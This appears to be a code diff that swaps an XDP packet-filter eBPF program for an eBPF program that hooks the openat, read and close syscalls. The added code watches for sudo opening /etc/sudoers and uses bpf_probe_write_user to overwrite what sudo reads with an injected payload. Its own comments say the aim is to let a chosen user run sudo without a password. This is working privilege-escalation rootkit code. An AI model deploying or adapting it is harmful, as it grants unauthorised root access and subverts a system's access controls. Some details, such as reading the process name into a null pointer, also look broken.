@@ -1,96 +1,250 @@
+/*
+// #include "./vmlinux.h"
+// #include <bpf/bpf.h>
 #include <linux/bpf.h>
 #include <bpf/bpf_helpers.h>
+#include <bpf/bpf_core_read.h>
+#include <bpf/bpf_tracing.h>
+// #include "./maps.h"
+*/
 
-#include <linux/if_ether.h>
-#include <arpa/inet.h>
-#include <linux/ip.h>
-#include <linux/udp.h>
+#include<linux/vmlinux.h>
+#include <bpf/bpf_helpers.h>
+#include <bpf/bpf_core_read.h>
 
-struct
+#define __EXPORTED_STRUCT __attribute__((unused));
+#define __EXPORTED_DEFINE(exported_struct_name, useless_identifier) \
+    const struct exported_struct_name * useless_identifier __EXPORTED_STRUCT;
+
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 8192);
+    __type(key, size_t);
+    __type(value, char[4096]);
+} map_payload_buffer SEC(".maps");
+
+// Ringbuffer Map to pass messages from kernel to user
+struct {
+    __uint(type, BPF_MAP_TYPE_RINGBUF);
+    __uint(max_entries, 256 * 1024);
+} rb SEC(".maps");
+
+// Map to hold the File Descriptors from 'openat' calls
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 8192);
+    __type(key, size_t);
+    __type(value, unsigned int);
+} map_fds SEC(".maps");
+
+// Map to fold the buffer sized from 'read' calls
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 8192);
+    __type(key, size_t);
+    __type(value, long unsigned int);
+} map_buff_addrs SEC(".maps");
+
+// Report Events
+struct event {
+    int pid;
+    char comm[TASK_COMM_LEN];
+    bool success;
+};
+// const struct event *unused UNUSED;
+__EXPORTED_DEFINE(event, unused1);
+
+char LICENSE[] SEC("license") = "Dual BSD/GPL";
+
+
+// Optional Target Parent PID
+const volatile int target_ppid = 0;
+
+// The UserID of the user, if we're restricting
+// running to just this user
+const volatile int uid = 0;
+
+// These store the string we're going to
+// add to /etc/sudoers when viewed by sudo
+// Which makes it think our user can sudo
+// without a password
+#define max_payload_len 100
+const volatile int payload_len = 0;
+const volatile char payload[100];
+
+SEC("tp/syscalls/sys_enter_openat")
+int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
 {
-	__uint(type, BPF_MAP_TYPE_HASH);
-	__type(key, __u32);
-	__type(value, long);
-	__uint(max_entries, 1024);
-} drop_to_addrs SEC(".maps");
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    // int pid = pid_tgid >> 32;
+    // Check if we're a process thread of interest
+    // if target_ppid is 0 then we target all pids
+    if (target_ppid != 0) {
+        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
+        int ppid = BPF_CORE_READ(task, real_parent, tgid);
+        if (ppid != target_ppid) {
+            return 0;
+        }
+    }
 
-struct
-{
-	__uint(type, BPF_MAP_TYPE_HASH);
-	__type(key, __u32);
-	__type(value, long);
-	__uint(max_entries, 1024);
-} drop_from_addrs SEC(".maps");
+    // Check comm is sudo
+    char *comm = NULL;
+    if(bpf_get_current_comm(comm, sizeof(comm)) != 0 ) {
+        return 0;
+    }
+    const int sudo_len = 5;
+    const char *sudo = "sudo";
+    for (int i = 0; i < sudo_len; i++) {
+        if (comm[i] != sudo[i]) {
+            return 0;
+        }
+    }
 
-struct
-{
-	__uint(type, BPF_MAP_TYPE_RINGBUF);
-	__uint(max_entries, 1 << 24);
-} event_report_area SEC(".maps");
+    // Now check we're opening sudoers
+    const int sudoers_len = 13;
+    const char *sudoers = "/etc/sudoers";
+    char filename[sudoers_len];
+    bpf_probe_read_user(&filename, sudoers_len, (char*)ctx->args[1]);
+    for (int i = 0; i < sudoers_len; i++) {
+        if (filename[i] != sudoers[i]) {
+            return 0;
+        }
+    }
+    bpf_printk("Comm %s\n", comm);
+    bpf_printk("Filename %s\n", filename);
 
-typedef __u32 u32;
-typedef __u8 u8;
+    // If filtering by UID check that
+    if (uid != 0) {
+        int current_uid = bpf_get_current_uid_gid() >> 32;
+        if (uid != current_uid) {
+            return 0;
+        }
+    }
 
-struct my_event
-{
-	u32 saddr;
-	u32 daddr;
-}; 
-const struct my_event *unused __attribute__((unused));
+    // Add pid_tgid to map for our sys_exit call
+    unsigned int zero = 0;
+    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);
 
-SEC("xdp_durdur_drop")
-int xdp_durdur_drop_func(struct xdp_md *ctx)
-{
-	void *data_end = (void *)(long)ctx->data_end;
-	void *data = (void *)(long)ctx->data;
-	struct ethhdr *eth = data;
-	long *value;
-	struct my_event *report;
-
-	uint64_t nh_off = sizeof(*eth);
-	if (data + nh_off > data_end)
-	{
-		return XDP_PASS;
-	}
-
-	struct iphdr *iph = data + nh_off;
-	struct udphdr *udph = data + nh_off + sizeof(struct iphdr);
-	if (udph + 1 > (struct udphdr *)data_end)
-	{
-		return XDP_PASS;
-	}
-
-	__u32 saddr = iph->daddr;
-	__u32 daddr = iph->saddr;
-	
-	value = bpf_map_lookup_elem(&drop_to_addrs, &saddr);
-	if (value)
-	{
-		*value += 1;
-		goto DROPPER;
-	}
-
-	value = bpf_map_lookup_elem(&drop_from_addrs, &daddr);
-	if (value)
-	{
-		*value += 1;
-		goto DROPPER;
-	}
-
-	return XDP_PASS;
-
-DROPPER:
-	report = bpf_ringbuf_reserve(&event_report_area, sizeof(struct my_event), 0);
-	// bpf_printk("Reporting");
-	if (!report)
-	{
-		// bpf_printk("Report Error");
-		return XDP_DROP;
-	}
-	report->saddr = saddr;
-	report->daddr = daddr;
-	bpf_ringbuf_submit(report, BPF_RB_FORCE_WAKEUP);
-	return XDP_DROP;
+    return 0;
 }
 
-char _license[] SEC("license") = "GPL";
+SEC("tp/syscalls/sys_exit_openat")
+int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
+{
+    // Check this open call is opening our target file
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    if (check == 0) {
+        return 0;
+    }
+    // int pid = pid_tgid >> 32;
+
+    // Set the map value to be the returned file descriptor
+    unsigned int fd = (unsigned int)ctx->ret;
+    // unsigned int fd = (unsigned int)ctx->ret;
+    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);
+
+    return 0;
+}
+
+SEC("tp/syscalls/sys_enter_read")
+int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
+{
+    // Check this open call is opening our target file
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    // int pid = pid_tgid >> 32;
+    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    if (pfd == 0) {
+        return 0;
+    }
+
+    // Check this is the sudoers file descriptor
+    unsigned int map_fd = *pfd;
+    unsigned int fd = (unsigned int)ctx->args[0];
+    if (map_fd != fd) {
+        return 0;
+    }
+
+    // Store buffer address from arguments in map
+    long unsigned int buff_addr = ctx->args[1];
+    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);
+
+    // log and exit
+    // size_t buff_size = (size_t)ctx->args[2];
+    return 0;
+}
+
+SEC("tp/syscalls/sys_exit_read")
+int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
+{
+    // Check this open call is reading our target file
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    int pid = pid_tgid >> 32;
+    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
+    if (pbuff_addr == 0) {
+        return 0;
+    }
+    long unsigned int buff_addr = *pbuff_addr;
+    if (buff_addr <= 0) {
+        return 0;
+    }
+
+    // This is amount of data returned from the read syscall
+    if (ctx->ret <= 0) {
+        return 0;
+    }
+    long int read_size = ctx->ret;
+    // long int read_size = ctx->ret;
+
+    // Add our payload to the first line
+    if (read_size < payload_len) {
+        return 0;
+    }
+
+    // Overwrite first chunk of data
+    // then add '#'s to comment out rest of data in the chunk.
+    // This sorta corrupts the sudoers file, but everything still
+    // works as expected
+    char local_buff[max_payload_len] = { 0x00 };
+    bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
+    for (unsigned int i = 0; i < max_payload_len; i++) {
+        if (i >= payload_len) {
+            local_buff[i] = '#';
+        }
+        else {
+            local_buff[i] = payload[i];
+        }
+    }
+    // Write data back to buffer
+    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);
+    // long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);
+
+    // Send event
+    struct event *e;
+    e = bpf_ringbuf_reserve(&rb, sizeof(struct event*), 0);
+    if (e) {
+        e->success = (ret == 0);
+        e->pid = pid;
+        bpf_get_current_comm(&e->comm, sizeof(e->comm));
+        bpf_ringbuf_submit(e, 0);
+    }
+    return 0;
+}
+
+SEC("tp/syscalls/sys_exit_close")
+int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
+{
+    // Check if we're a process thread of interest
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    // int pid = pid_tgid >> 32;
+    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    if (check == 0) {
+        return 0;
+    }
+
+    // Closing file, delete fd from all maps to clean up
+    bpf_map_delete_elem(&map_fds, &pid_tgid);
+    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);
+
+    return 0;
+}
